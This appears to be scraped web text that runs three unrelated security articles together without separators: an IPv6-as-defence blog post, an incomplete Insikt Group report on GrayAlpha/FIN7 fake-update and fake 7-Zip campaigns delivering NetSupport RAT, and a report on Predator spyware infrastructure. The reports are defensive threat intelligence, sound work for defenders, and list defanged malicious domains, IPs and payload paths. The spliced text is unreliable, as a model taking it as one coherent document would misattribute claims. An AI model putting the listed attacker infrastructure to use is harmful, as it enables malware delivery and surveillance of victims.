        <p>What if eliminating opportunistic attacks required nothing more than updating your network architecture? The vast IPv6 address space transforms internet-wide scanning from trivial to computationally impossible, removing one critical leg from the attacker's operational stool.</p>
        <p>Modern adversaries operate on economics: maximum victims, minimum effort. <strong>IPv6's</strong> <strong><a href="https://www.techtarget.com/whatis/feature/IPv6-addresses-how-many-is-that-in-numbers">340 undecillion addresses</a></strong> create an insurmountable barrier for brute-force discovery and enumeration, forcing attackers to abandon cheap, scalable tactics. Organizations dismissing this advantage miss a critical opportunity to reduce their attack surface while security teams fight multi-front battles against AI-powered threats.</p>
        <h2>The Opportunistic Threat Reality</h2>
        <p>Recorded Future tracks thousands of automated exploitation campaigns daily, following a predictable pattern. Vulnerability disclosure triggers mass scanning within hours, leading to indiscriminate compromise of exposed systems.</p>
        <p>Recent campaigns demonstrate the scale:</p>
        <ul>
          <li><a href="https://onapsis.com/blog/active-exploitation-of-sap-vulnerability-cve-2025-31324/">CVE-2025-31324 (SAP NetWeaver)</a>: 581 systems compromised via mass scanning; 1,800+ targets identified</li>
          <li><a href="https://censys.com/advisory/cve-2024-3400">CVE-2024-3400 (PAN-OS)</a>: thousands of compromised devices in 72 hours</li>
          <li><a href="https://www.picussecurity.com/resource/blog/cve-2023-4966-lockbit-exploits-citrix-bleed-in-ransomware-attacks">CVE-2023-4966 (CitrixBleed)</a>: Over 20,000 servers breached via automated scanning</li>
          <li><a href="https://www.rapid7.com/blog/post/2023/06/01/rapid7-observed-exploitation-of-critical-moveit-transfer-vulnerability/">CVE-2023-34362 (MOVEit Transfer)</a>: 2500 instances exposed to the internet; initial access through internet-wide vulnerability discovery</li>
        </ul>
        <p>The volume metrics paint a sobering picture. <a href="https://us.norton.com/blog/emerging-threats/cybersecurity-statistics">IoT devices are attacked within 5 minutes</a> of connecting to the internet. Internet “background noise” includes 4.2 billion simultaneous events (five years ago). <a href="/podcast-episode-126">152 billion scan probes</a> are sent across the IPv4 internet daily, including <a href="https://us.norton.com/blog/emerging-threats/cybersecurity-statistics">36,000 automated scans per second</a>.</p>

        <h2>The Three-Legged Stool of Modern Remote Attacks</h2>
        <p>Threat actors balance operations on three critical foundations. Remove any leg, and its operational efficiency collapses.</p>
        <p><strong>Leg Alpha: Opportunistic Scanning</strong> Automated discovery exploits internet-exposed vulnerabilities at scale. IPv6 effectively saws off this leg by making comprehensive scanning computationally infeasible.</p>
        <p><strong>Leg Beta: Targeted Reconnaissance</strong> Domain enumeration, supply chain analysis, and social engineering remain unaffected. Adversaries leverage Certificate Transparency logs, passive DNS, and BGP announcements to build targeted hit lists.</p>
        <p><strong>Leg Charlie: Identity &amp; Insider Access</strong> Compromised credentials and third party breaches bypass network controls entirely. Address space complexity offers zero defense against authenticated attacks (and social engineering, which is a fourth leg).</p>
        <h2>Reality Check: IPv6 Security Benefits</h2>
        <p>The security community debates IPv6's defensive value, but data supports nuanced conclusions. Brute-force scanning genuinely <a href="https://www.usenix.org/system/files/sec24summer-prepub-965-williams.pdf">becomes harder</a>—even the fastest academic scanners map only millions of hosts from 2^128 possibilities.</p>
        <p>However, targeted discovery remains trivial. Adversaries enumerate targets through domain names, WHOIS records, and Certificate Transparency logs. Dual-stack deployments particularly undermine benefits, as attackers simply pivot from IPv4 reconnaissance.</p>
        <p>Key defensive advantages include:</p>
        <ul>
          <li>Address space enables thousands of deception nodes</li>
          <li>Granular segmentation without NAT complexity</li>
          <li>Protocol modernization enforces TLS 1.3 and <a href="https://www.auvik.com/franklyit/blog/what-is-quic-protocol/">QUIC</a></li>
          <li>Moving-target defense becomes economically viable</li>
        </ul>
        <h2>Practical Implementation Architecture</h2>
        <p>Organizations should maximize IPv6's defensive advantages while acknowledging its limitations. The evidence-based approach spans three phases over 24 months.</p>
        <p><strong>Phase Alpha: Foundation (Months 0-6)</strong> Deploy dual-stack architecture with IPv6-preferred public services. Implement strict ICMPv6 filtering, unpredictable address allocation, and comprehensive connection monitoring. Every IPv6 probe becomes a high-value threat signal.</p>
        <p><strong>Phase Beta: Segmentation (Months 6-12)</strong> Allocate /64 subnets per application tier with host-based microsegmentation. Deploy source address validation at edge routers and create honeypot networks throughout unused address space.</p>
        <p><strong>Phase Gamma: Advanced Defense (Months 12-24)</strong> Enable rapid address rotation for moving-target defense. Deploy IPv6-only management interfaces behind Single Packet Authorization, integrate telemetry into threat-hunting platforms, and participate in collaborative intelligence sharing.</p>

        <h2>Measuring Risk Reduction</h2>
        <p>IPv6 deployment will deliver a significant drop in scanning, and additional canary hosts/services will help create metrics that translate to increased operational efficiency. Security teams spend less time chasing automated noise, focusing instead on sophisticated threats that matter.</p>
        <h2>Future-Proofing Against AI-Powered Attacks</h2>
        <p>The next five years demand strategies that counter automated exploitation at machine speed. IPv6 enables several critical defensive patterns that become essential as AI agents weaponize vulnerabilities within minutes.</p>
        <p><strong>Autonomous Defense Pipelines:</strong> Integrate CVE feeds with LLM agents that generate patches faster than attackers can weaponize exploits. Deploy eBPF-based sidecars ingesting real-time signatures, pushing rules globally via service mesh.</p>
        <p><strong>Zero-Exposure Architecture:</strong> Hide services behind cryptographic authentication using Single Packet Authorization or modern <a href="https://blogs.infoblox.com/ipv6-coe/ipv6-enhances-zero-trust-network-architectures/">ZTNA</a>. Removes targets from the attack graph entirely—zero exposed surface equals zero remote exploitation (in theory).</p>
        <p><strong>Continuous Surface Mutation:</strong> Leverage abundant IPv6 space for constant re-addressing and port shuffling. Combined with binary diversification and container re-imaging, force adversaries to continuously rediscover targets.</p>
        <h2>Strategic Recommendations</h2>
        <p>Security leaders planning 2025-2030 roadmaps should consider adopting this blueprint:</p>
        <ol>
          <li>Deploy IPv6-only for public services where feasible</li>
          <li>Publish no AAAA DNS records for management interfaces</li>
          <li>Automate defensive kill-chains matching attacker speed</li>
          <li>Implement moving-target techniques using address abundance</li>
          <li>Shift to memory-safe languages, eliminating bug classes</li>
          <li>Treat every /64 scan as suspicious intelligence</li>
          <li>Share sanitized samples with collaborative defense communities</li>
        </ol>
        <h2>The Bottom Line</h2>
        <p>IPv6 won't stop nation-states or targeted ransomware groups, but it eliminates <a href="https://www.researchgate.net/publication/262351991_Understanding_IPv6_Internet_background_radiation">the background radiation</a> consuming security resources. Opportunistic campaigns that compromise thousands of organizations simply cannot operate efficiently in IPv6's vast address space.</p>
        <p>Smart organizations recognize that removing entire attack classes beats chasing perfect security. IPv6 takes mass scanning off the table, forcing adversaries to reveal themselves through targeted activity. In an era where defensive teams need every advantage, that's one less leg supporting the attacker's operational model—and one more reason IPv6 belongs in your security roadmap.</p>

          <img loading="lazy" alt="insikt group logo" src="https://www.recordedfuture.com/media_17759d8b91bf0c9106a0fa82007bef7e3316158b4.png?width=750&amp;format=png&amp;optimize=medium" width="300" height="48" />
        </p>
        <h2>Executive Summary</h2>
        <p>Insikt Group identified new infrastructure associated with GrayAlpha, a threat actor that overlaps with the financially motivated group commonly referred to as FIN7. This newly identified infrastructure includes domains used for payload distribution and additional IP addresses believed to be tied to GrayAlpha. Insikt Group discovered a custom PowerShell loader named PowerNet, which decompresses and executes NetSupport RAT. Insikt Group identified another custom loader, referred to as MaskBat, that has similarities to FakeBat but is obfuscated and contains strings linked to GrayAlpha. Overall, Insikt Group found three primary infection methods: fake browser update pages, fake 7-Zip download sites, and the traffic distribution system (TDS) TAG-124. Notably, the use of TAG-124 had not been publicly documented prior to this report. Although all three infection vectors were observed being used simultaneously, only the fake 7-Zip download pages were still active at the time of writing, with newly registered domains appearing as recently as April 2025. Further analysis of these sites led to the identification of an individual who may be involved in the GrayAlpha operation.</p>
        <p>In the near term, defenders are advised to enforce application allow-lists to block the download of seemingly legitimate files that contain malware. Where allow-lists are not practical, comprehensive employee security training becomes essential, particularly in recognizing suspicious behaviors such as unexpected prompts for browser updates or redirects caused by malvertising. Additionally, the use of detection rules, such as the YARA rules and Malware Intelligence Hunting queries provided in this report, is critical for identifying both existing and past infections. These rules should be updated frequently and supported with broader detection techniques, including monitoring of network artifacts and using Recorded Future Network Intelligence, due to the constantly evolving nature of malware.</p>
        <p>Looking ahead, defenders must monitor the broader cybercriminal ecosystem to anticipate and respond to emerging threats more effectively. The continued professionalization of cybercrime increases the likelihood of organizations across multiple industries being targeted. This trend is driven by the sustained profitability of cybercrime, limited international law enforcement collaboration, and the continuous evolution of security technologies, which in turn drive innovation among threat actors. While advanced persistent threat (APT) activity is often linked to state-sponsored entities, GrayAlpha illustrates that cybercriminal groups can demonstrate a similar level of persistence. Much like the ransomware-as-a-service (RaaS) model, cybercriminals are becoming increasingly specialized and collaborative, making it imperative to adopt a comprehensive and adaptive security posture.</p>

        </ul>
        <h2>Background</h2>
        <p>GrayAlpha is a threat actor cluster that overlaps with the financially motivated cybercriminal group commonly known as FIN7, sharing key infrastructure, tooling, and tradecraft.</p>
        <p>FIN7 has been active since at least 2013 and is considered one of the most prolific and technically sophisticated cybercriminal groups targeting organizations worldwide. The group is organized like a professional business, with compartmentalized teams handling malware development, phishing operations, money laundering, and management. FIN7 is primarily known for financially motivated <a href="https://www.fbi.gov/contact-us/field-offices/seattle/news/stories/how-cyber-crime-group-fin7-attacked-and-stole-data-from-hundreds-of-us-companies">campaigns</a> involving the theft of payment card data and unauthorized access to corporate networks, particularly within the retail, hospitality, and financial sectors.</p>
        <p>In 2018, the US Department of Justice (US DOJ) <a href="https://www.justice.gov/archives/opa/pr/three-members-notorious-international-cybercrime-group-fin7-custody-role-attacking-over-100">unsealed</a> indictments against three high-ranking FIN7 members — Dmytro Fedorov, Fedir Hladyr, and Andrii Kolpakov — highlighting the group’s extensive operations against businesses across 47 US states and multiple countries. Operating under the name of a sham cybersecurity firm, “Combi Security,” FIN7 leveraged social engineering and customized malware, including variants of Carbanak, the group’s in-house developed backdoor, to compromise thousands of point-of-sale systems and exfiltrate over 15 million payment card records. The US DOJ prosecutions revealed the group’s hierarchical command structure, with members fulfilling defined roles in intrusion operations, malware administration, and logistical coordination. Despite the disruption to its leadership, FIN7’s underlying infrastructure and tradecraft persisted, enabling the broader criminal enterprise to <a href="https://krebsonsecurity.com/2024/07/the-stark-truth-behind-the-resurgence-of-russias-fin7/">continue</a> targeting global organizations.</p>
        <p>FIN7 uses a range of custom and repurposed malware and tooling to support its operations. The group typically gains initial access through spearphishing emails containing malicious attachments or links hosted on compromised sites, often combined with callback phishing to increase credibility. FIN7’s early operations leveraged its then-proprietary Carbanak backdoor as the primary command-and-control framework, enabling the group to manage compromised hosts and coordinate post-compromise activity. POWERTRASH — a uniquely obfuscated, PowerShell-based, in-memory loader adapted from the PowerSploit framework — has also been a consistent feature of FIN7 intrusions, used to deploy payloads such as DiceLoader and cracked Core Impact implants to support exploitation, lateral movement, and persistence. FIN7 also developed AuKill (also known as AvNeutralizer), a custom EDR evasion utility designed to disable endpoint security solutions, which was later <a href="https://www.bleepingcomputer.com/news/security/notorious-fin7-hackers-sell-edr-killer-to-other-threat-actors/">reported</a> to have been offered for sale by the group on criminal marketplaces. In its most recent campaigns, FIN7 has been observed deploying the Python-based Anubis backdoor, which provides full system control via in-memory execution and communicates with its command-and-control infrastructure using Base64-encoded data.</p>
        <p>In 2023, FIN7 <a href="https://therecord.media/researchers-tie-fin7-cybercrime-family-to-clop-ransomware-microsoft">expanded</a> its operations to include the deployment of ransomware through affiliations with RaaS groups such as REvil and Maze, while also managing its own RaaS programs, including the now-retired Darkside and BlackMatter. More recently, FIN7 has been observed leveraging NetSupport RAT embedded within malicious MSIX application packages, delivered via fake update sites and malvertising.</p>
        <h2>Threat Analysis</h2>
        <h3>Infection Vectors</h3>
        <p>Over the past year, Insikt Group has identified three distinct infection vectors associated with GrayAlpha, observed during overlapping timeframes, and all ultimately resulting in NetSupport RAT infections. These vectors include:</p>
        <ul>
          <li><strong>Infection Vector 1:</strong> Fake software updates impersonating legitimate products such as Concur</li>
          <li><strong>Infection Vector 2:</strong> Malicious 7-Zip download pages</li>
          <li><strong>Infection Vector 3:</strong> Use of the TAG-124 TDS</li>
        </ul>
        <p>In these campaigns, GrayAlpha employed two primary types of PowerShell loaders: a self-contained custom script known as PowerNet, and a dynamic loader — a customized variant of FakeBat — referred to as MaskBat (see <strong>Figure 1</strong>).</p>

          </div>
        </div>
        <h3>Infection Vector 1: Fake Browser Updates</h3>
        <h4>Infrastructure Analysis</h4>
        <p>Since at least April 2024, GrayAlpha has been observed leveraging fake browser update websites as part of its operations. These sites impersonate a range of legitimate products and services, including Google Meet, LexisNexis, Asana, AIMP, SAP Concur, CNN, the Wall Street Journal, and Advanced IP Scanner, among others. <strong>Table 1</strong> provides a list of domains associated with Infection Vector 1 that were still resolving as of 2025. However, it is important to note that active domain resolution does not necessarily indicate ongoing use by threat actors; in fact, the most recently observed domain began resolving in September 2024. A comprehensive list of all domains linked to Infection Vector 1 — including those that did not resolve at any point in 2025 — can be found in <strong>Appendix A</strong>.</p>

        <p><strong><em>Table 1:</em></strong> <em>Domains linked to Infection Vector 1 still resolving as of 2025 (Source: Recorded Future)</em></p>
        <p>Fake update websites often use the same script designed to fingerprint the host system, consisting of the functions getIPAddress() and trackPageOpen(). As previously reported, these scripts usually send a POST request to a CDN-themed domain, such as <em>cdn40[.]click</em> (see <strong>Figure 2</strong>). These domains typically begin with "cdn" followed by a random number and a top-level domain (TLD). The malicious payload is commonly delivered via the /download.php endpoint. However, Insikt Group has also identified variations, including /download/download.php, download2.php, and product-specific paths (such as /download/aimp_5.30.2541_w64-release.exe). Additionally, in at least one case, the threat actors <a href="https://pro.urlscan.io/result/ac51686b-4741-4dcd-bbad-37daa47555a3/dom">appeared</a> to use a compromised domain — <em>worshipjapan[.]com</em> — for fingerprinting purposes. This activity was observed on a website associated with the domain <em>as4na[.]com</em>.</p>

        <p>Notably, while most domains associated with Infection Vector 1 are crafted to impersonate legitimate software products, some appear to be randomly generated or arbitrary. Examples include <em>teststeststests003202[.]shop</em>, which is tied to the email address <em>kasalboov@web[.]de</em>, according to its WHOIS record. This same email is also linked to domains such as <em>lexisnexis[.]pro</em>, <em>aimp[.]xyz</em>, <em>concur[.]life</em>, <em>cdn3535[.]shop</em>, and <em>cdn251[.]lol</em>. Additional anomalies include domains like <em>gogogononono[.]top</em> and <em>gogogononono[.]xyz</em>, both hosted on the IP address <em>103[.]35[.]190[.]40</em>, which also hosts lexisnexis[.]lat.</p>
        <h5>FIN7’s Previous Activity Using Fake Advanced IP Scanner</h5>
        <p>Although the first Advanced IP Scanner–themed domains linked to GrayAlpha, as discussed in this report, began resolving in early 2024 (see <strong>Figure 3</strong>), Insikt Group had already observed FIN7 leveraging a fake Advanced IP Scanner domain to compromise victims as early as the second half of 2023. Specifically, during a brief period at the end of September 2023, Insikt Group identified over 212 infected systems communicating with a FIN7-controlled Carbanak C2 server <em>166[.]1[.]160[.]118</em> via TCP port 443. While this activity was initially attributed to the exploitation of a one-day vulnerability chain, subsequent analysis <a href="https://tria.ge/230927-vr6d9sea73/behavioral1">revealed</a> that the infections were instead linked to the typosquatted domain <em>advanced-ip-sccanner[.]com</em> — which was hosted behind Cloudflare at the time.</p>

        <h4>Hosting Analysis</h4>
        <p>The vast majority of domains associated with Infection Vector 1 resolved to infrastructure operated by the bulletproof hoster, Stark Industries Solutions (AS44477), with additional hosting observed on AS29802 (HIVELOCITY, Inc.) and AS41745 (FORTIS-AS) (see <strong>Figure 4</strong>). Notably, infrastructure within AS29802 consisted of IP space controlled by bulletproof hoster 3NT Solutions LLP and announced via HIVELOCITY. Hosting infrastructure for Infection Vector 2 is predominantly concentrated within AS41745, as detailed further in the <strong>Infection Vector 2: 7-Zip Impersonation</strong> section of this report.</p>

          </div>
        </div>
        <p>FORTIS-AS (AS41745), commonly referenced by its responsible organization, “Baykov Ilya Sergeevich” (ORG-HIP1-RIPE), has been repeatedly leveraged in activities related to FIN7. In addition to infrastructure linked to Stark Industries Solutions, FORTIS-AS has hosted infrastructure used to deploy malware families such as POWERTRASH and DiceLoader, both of which are directly associated with FIN7 operations.</p>
        <p>According to the WHOIS record for netblock <em>85[.]209[.]134[.]0/24</em>, which is used by GrayAlpha, the block is assigned to Baykov Ilya Sergeevich (ORG-HIP1-RIPE). This entity is closely tied to the infrastructure service provider (ISP) “hip-hosting”, with multiple contact points and technical references — including domains such as <em>fortis[.]host</em> and <em>hip-hosting[.]com</em> — appearing throughout the record (see <strong>Figure 5</strong>).</p>

        <p>Insikt Group assesses with high confidence that “hip-hosting” is the ISP behind the entity “Baykov Ilya Sergeevich” (ORG-HIP1-RIPE).

        </p>
        <h2>Executive Summary</h2>
        <p>Following major public exposures by Insikt Group and others throughout the last two years, alongside US government sanctions targeting the Intellexa Consortium — the organizational structure behind the Predator mobile spyware — Insikt Group observed a significant decline in Predator-related activity. This apparent decline raised questions about whether the combination of US sanctions, public exposure, and broader international efforts to curb spyware proliferation, such as the UK and France-led Pall Mall process, had dealt a lasting blow to Intellexa’s operations. Yet, Predator activity has not stopped, and in recent months, Insikt Group has observed a resurgence of activity, reflecting the operators’ continued persistence. While much of the identified infrastructure is tied to known Predator operators in countries previously identified by Insikt Group, a new customer has also been identified in Mozambique — a country not previously publicly linked to the spyware. This aligns with the broader observation that Predator is highly active in Africa, with over half of its identified customers located on the continent. Additionally, Insikt Group has found a connection between high-tier Predator infrastructure and a Czech entity previously associated with the Intellexa Consortium.</p>
        <p>The deployment of spyware like Predator beyond legitimate criminal or counterterrorism use poses serious threats to privacy, legal rights, and the physical safety of both direct targets and associated individuals. While most known cases of abuse have targeted civil society and political activists, individuals and organizations in regions with a record of spyware misuse should remain vigilant, regardless of sector. Given Predator’s expensive licensing model, its use is typically reserved for high-value, strategic targets. This makes politicians, corporate executives, and others in sensitive positions especially vulnerable due to the intelligence they may possess. The use of spyware against political opposition figures is currently under investigation in several EU countries, reflecting wider global efforts to curb the activities of mercenary spyware developers.</p>
        <p>As outlined in Insikt Group’s previous reports on Predator, defenders should follow recommended best practices. These include ensuring personal and corporate devices are kept separate, regularly updating phones, encouraging periodic device reboots (though this may not always fully eliminate Predator), using lockdown mode, and implementing a mobile device management (MDM) system. Additionally, investing in security awareness training for employees and fostering a culture of minimal data exposure are essential for reducing the risk of successful spearphishing attacks and limiting data theft in the event of a breach.</p>
        <p>Insikt Group expects the mercenary spyware market to continue expanding, fueled by sustained demand and corporate profitability. This growth will likely be accompanied by ongoing innovation, as rising competition and strengthened IT security among targets drive the development of new products and techniques. For instance, as defenders work to eliminate entire classes of vulnerabilities, spyware operators may adapt by targeting alternatives such as cloud backups accessed via stolen credentials or by employing new deployment methods. As these tools proliferate and techniques evolve, the range of victims is likely to extend beyond civil society, influencing political discourse and sparking further legal confrontations. Recent court rulings in favor of technology companies against spyware vendors may set a precedent, encouraging more firms to actively challenge the misuse of their platforms. Insikt Group anticipates that spyware vendors will continue leveraging complex corporate structures to evade sanctions or detection, while increasingly tailoring their operations to specific regions, a trend often described as the balkanization of the ecosystem.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>Insikt Group has identified new infrastructure associated with Predator, indicating continued operations despite public exposure, international sanctions, and policy interventions.</li>
          <li>The newly identified infrastructure includes both victim-facing Tier 1 servers as well as high-tier components that likely link back to Predator operators in various countries.</li>
          <li>Although much of Predator’s infrastructure remains consistent with previous reporting, its operators have introduced changes designed to further evade detection — a pattern Insikt Group noted in earlier reporting.</li>
          <li>Insikt Group has detected Predator-related activity in several countries throughout the last twelve months and is the first to report a suspected Predator operator presence in Mozambique.</li>
          <li>Insikt Group also connected components of Predator’s infrastructure to a Czech entity previously linked with the Intellexa Consortium by a Czech investigative outlet.</li>
        </ul>
        <h2>Background</h2>
        <p>Predator is a sophisticated mercenary spyware targeting both Android and iPhone devices and has been active since at least 2019. Originally developed by Cytrox and now operated under the Intellexa alliance, Predator is engineered for flexibility and stealth, leaving minimal evidence on infected devices and making external investigations into abuse particularly challenging. Once deployed, Predator provides complete access to a device’s microphone, camera, and all data — such as contacts, messages, photos, and videos — without the victim’s awareness. The spyware’s modular design, based on Python, <a href="https://blog.talosintelligence.com/mercenary-intellexa-predator/">allows</a> operators to introduce new features remotely, without the need to re-exploit the device.</p>
        <p>Predator can be <a href="https://citizenlab.ca/2021/12/pegasus-vs-predator-dissidents-doubly-infected-iphone-reveals-cytrox-mercenary-spyware/">delivered</a> through both "1-click" and "zero-click" attack vectors. "1-click" attacks rely on social engineering messages with malicious links that require user interaction (<a href="https://citizenlab.ca/2023/09/predator-in-the-wires-ahmed-eltantawy-targeted-with-predator-spyware-after-announcing-presidential-ambitions/">1</a>, <a href="https://citizenlab.ca/2021/12/pegasus-vs-predator-dissidents-doubly-infected-iphone-reveals-cytrox-mercenary-spyware/">2</a>, <a href="https://www.amnesty.org/en/documents/act10/7245/2023/en/">3</a>), while "zero-click" attacks, described in the "<a href="https://www.amnesty.org/en/documents/act10/7245/2023/en/">Predator Files</a>," involve techniques that do not require any action from the target, such as network injection or proximity-based methods. However, there have been no confirmed cases of Predator using fully remote "zero-click" exploits like those seen with NSO Group Pegasus, which can compromise devices through messaging apps without any user interaction (for example, <a href="https://citizenlab.ca/2021/09/forcedentry-nso-group-imessage-zero-click-exploit-captured-in-the-wild/">FORCEDENTRY</a> or <a href="https://citizenlab.ca/2023/09/blastpass-nso-group-iphone-zero-click-zero-day-exploit-captured-in-the-wild/">BLASTPASS</a>).</p>
        <p>Over the past two years, Insikt Group has identified suspected Predator operators in more than a dozen countries, including in Angola, Armenia, Botswana, the Democratic Republic of the Congo, Egypt, Indonesia, Kazakhstan, Mongolia, Mozambique, Oman, the Philippines, Saudi Arabia, and Trinidad and Tobago (<a href="/research/predator-spyware-operators-rebuild-multi-tier-infrastructure-target-mobile-devices">1</a>, <a href="/research/predator-spyware-infrastructure-returns-following-exposure-sanctions">2</a>). Notably, this is the first public report to identify Mozambique as a suspected customer. While Predator is ostensibly marketed for counterterrorism and law enforcement purposes, previous reporting has documented a clear pattern of its deployment against civil society actors, including journalists and activists, and politicians (<a href="https://citizenlab.ca/2021/12/pegasus-vs-predator-dissidents-doubly-infected-iphone-reveals-cytrox-mercenary-spyware/">1</a>, <a href="https://insidestory.gr/article/poios-parakoloythoyse-kinito-toy-dimosiografoy-thanasi-koykaki">2</a>, <a href="https://www.nytimes.com/2023/03/20/world/europe/greece-spyware-hacking-meta.html">3</a>, <a href="https://citizenlab.ca/2023/09/predator-in-the-wires-ahmed-eltantawy-targeted-with-predator-spyware-after-announcing-presidential-ambitions/">4</a>). These instances described in earlier reports likely represent only a small portion of the overall abuses, given the widespread use of mercenary spyware like Predator, the difficulty of detection, and limited victim support. It is important to emphasize the risk of cross-border targeting, which has been observed not only with Predator, where an operator <a href="https://www.europarl.europa.eu/doceo/document/P-9-2024-001059_EN.html">linked</a> to Vietnam has targeted EU officials and members of the European Parliament, but also with <a href="https://www.brookings.edu/articles/how-digital-espionage-tools-exacerbate-authoritarianism-across-africa/">other mercenary spyware</a>, such as Pegasus.</p>
        <p>Despite increased public reporting on Predator’s infrastructure and <a href="https://www.amnesty.org/en/documents/act10/7245/2023/en/">techniques</a>, as well as growing attention to Intellexa’s <a href="https://dfrlab.org/2024/04/22/markets-matter-a-glance-into-the-spyware-industry/">corporate structure</a>, Predator operations remain active. This persistence continues even after measures such as <a href="https://home.treasury.gov/news/press-releases/jy2581">US sanctions</a>, an <a href="https://www.europarl.europa.eu/news/en/press-room/20230609IPR96217/spyware-meps-call-for-full-investigations-and-safeguards-to-prevent-abuse">EU resolution</a>, a <a href="https://home.treasury.gov/news/press-releases/jy2155">US visa</a> ban on Intellexa affiliates, and the launch of the <a href="https://www.gov.uk/government/publications/the-pall-mall-process-declaration-tackling-the-proliferation-and-irresponsible-use-of-commercial-cyber-intrusion-capabilities">Pall Mall Process</a>, alongside <a href="https://techcrunch.com/2024/04/06/price-of-zero-day-exploits-rises-as-companies-harden-products-against-hackers/?guce_referrer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8&amp;guce_referrer_sig=AQAAAK6C-oJQRNB8Ap98Hh44SWmj_mn3W34kE1QqlhLYsuHtMci4nmJrwMOGMgIpGRm65bQ5SYB7CKBzb-tHfP3jskDDrMZ9eMqRXBtY8VXdobKPRoCkTdTSpBua2hCEIfSN0NuoVfH2GDnsX1RrNIJtFXIOAz7Bb7tGkwpb0ROh9qnK&amp;guccounter=2">likely rising</a> exploit costs, particularly for iPhones. This likely reflects growing demand for spyware tools, especially in countries facing export restrictions, ongoing technical innovation in response to public reporting and security enhancements, and increasingly complex corporate structures designed to impede sanctions and attribution. One such example, involving a Czech entity likely linked to Predator operations, is discussed later in this report.</p>
        <h2>Threat Analysis</h2>
        <h3>Tier 1 (C2) Servers</h3>
        <p>Insikt Group has identified new victim-facing Tier 1 (C2) infrastructure that is highly likely associated with Predator, including domains and IP addresses. Although the specific functions of these domains and IP addresses have not yet been confirmed, they are probably involved in payload delivery and the exploitation process, consistent with previous infrastructure linked to Predator. A table in <strong>Appendix B</strong> presents the domains and IP addresses observed over the past twelve months.</p>
        <p>Previously, domains linked to Predator often impersonated specific organizations, such as frequently visited local news outlets, as Insikt Group has reported in the past (<a href="/research/predator-spyware-operators-rebuild-multi-tier-infrastructure-target-mobile-devices">1</a>, <a href="/research/predator-spyware-infrastructure-returns-following-exposure-sanctions">2</a>). However, this pattern began to gradually shift following increased media attention and public reporting from the end of 2023 onward. More recent domains now typically consist of two or more seemingly random English words. Insikt Group has observed that some of these domains reuse particular keywords; for instance, both <em>boundbreeze[.]com</em> and <em>branchbreeze[.]com</em> share the word "breeze". In a few recent cases, domains feature Portuguese-language words, which likely reflect the language of intended targets. Additionally, certain domains contain keywords that could provide clues to their targeting, such as <em>keep-badinigroups[.]com</em>, which may refer to communities or groups associated with the Badini dialect spoken in the Badinan region of Iraqi Kurdistan.</p>
        <p>The majority of identified domains have been registered through the registrar PDR Ltd. d/b/a PublicDomainRegistry.com and typically use name servers associated with <em>orderbox-dns[.]com</em>, among others. While Predator infrastructure has historically favored certain autonomous system numbers (ASNs) such as AS62005, AS61138, and AS44066, Insikt Group has observed that more recent Predator-linked domains are being hosted on a broader range of ASNs — including AS42708, AS20473, and AS44477 — which have not previously been connected to Predator activity. Notably, Insikt Group also identified at least one instance where a server tied to higher-tier Predator infrastructure was hosted with Stark Industries.</p>
        <h4>Suspected Infrastructure Detection Evasion Strategies</h4>
        <p>In response to ongoing public exposure, the operators behind Predator have adopted various tactics to evade detection. These involve using more varied server configurations than <a href="https://citizenlab.ca/2023/10/predator-spyware-targets-us-eu-lawmakers-journalists/">previously</a> <a href="https://blog.sekoia.io/active-lycantrox-infrastructure-illumination/">reported</a>, expanding the diversity of ASNs, and introducing additional layers to their multi-tiered infrastructure, among other approaches. One notable strategy involves the use of fake websites, which generally fall into four main categories: fake 404 error pages, counterfeit login or registration pages, sites indicating that they are under construction, and websites purporting to be associated with specific entities, such as a conference (see <strong>Figures 1-4</strong>).</p>

        </div>
        <h3>Multi-Tiered Infrastructure</h3>
        <p>As previously reported by Insikt Group, Predator customers continue to use a multi-tiered infrastructure network, which is likely designed to enable the targeting of specific individuals or entities (see <strong>Figure 5</strong>). This network closely resembles the high-level architecture <a href="https://www.amnesty.org/en/documents/act10/7245/2023/en/">outlined</a> in Amnesty’s October 2023 report, but it has continued to evolve since then. Earlier versions of Predator’s multi-tiered infrastructure, reported by Insikt Group in March 2024, featured only three layers. The addition of a fourth layer in the current design is likely intended to further obscure the identification of countries suspected of deploying Predator.</p>

          </div>
        </div>
        <p>Leveraging Recorded Future® Network Intelligence, Insikt Group has observed that Tier 1 servers consistently communicate with a dedicated Tier 2 upstream virtual private server (VPS) IP address using Transmission Control Protocol (TCP) port 10514. These upstream servers likely function as anonymization hop points, making it more difficult to associate Tier 1 servers directly with individual Predator customers. Communication over TCP port 10514 is also consistently observed between Tier 2 and Tier 3 servers. Subsequently, Tier 3 servers relay traffic to the Tier 4 layer, which appears to correspond to static, in-country ISP IP addresses suspected to be under the control of Predator customers. In every instance analyzed, both the Tier 1 servers and their corresponding upstream servers appeared to be dedicated exclusively to a single customer.</p>
        <p>While only Tiers 1 through 4 appear directly connected to the operational infrastructure of Predator customers, Insikt Group has also been monitoring an additional layer, tracked as Tier 5, that seems to play a central, though still unclear, role in Predator-related operations. Tier 5 servers have been linked to an entity in the Czech Republic, FoxITech s.r.o., which has previously been publicly associated with Intellexa and is discussed further in the Connection to Czech Entity section.</p>
        <h3>Suspected Predator Usage Within Specific Countries</h3>
        <p>Since Insikt Group began reporting on Predator in March 2024, suspected operators of the spyware have been identified in over a dozen countries worldwide. While several of these operators have remained active in the past twelve months, activity appears to have ceased in some locations, likely due to public reporting, leading to an overall lower number of current Predator operators. For example, in the Democratic Republic of the Congo (DRC), operations seem to have stopped about two weeks after Insikt Group published its findings on DRC-linked activity in September 2024. Similarly, the suspected operator in Angola became inactive around the same period, only to resume activity in early 2025, based on Recorded Future Network Intelligence. Additionally, Insikt Group has uncovered evidence of Predator use in Mozambique — a country where no Predator operators had been identified before this report.</p>
        <h4>Mozambique</h4>
        <p>Drawing on Recorded Future Network Intelligence and other artifacts, Insikt Group attributes the domains listed in <strong>Table 1</strong> with high confidence to a suspected Predator operator based in Mozambique. Additionally, several other domains, including <em>mdundobeats[.]com</em>, <em>noticiafamosos[.]com</em>, and <em>onelifestyle24[.]com</em>, as well as others from <strong>Appendix B</strong>, are likely linked to the same customer based on various technical indicators in Recorded Future sources. Notably, all IP addresses associated with these domains, except for the one hosting <em>onelifestyle24[.]com</em>, fall within the same two /24 CIDR ranges. Insikt Group further assesses, using both Recorded Future Network Intelligence and passive DNS data, that the suspected Predator operator in Mozambique became active during the first half of 2024 and still appears to be active at the time of writing.</p>

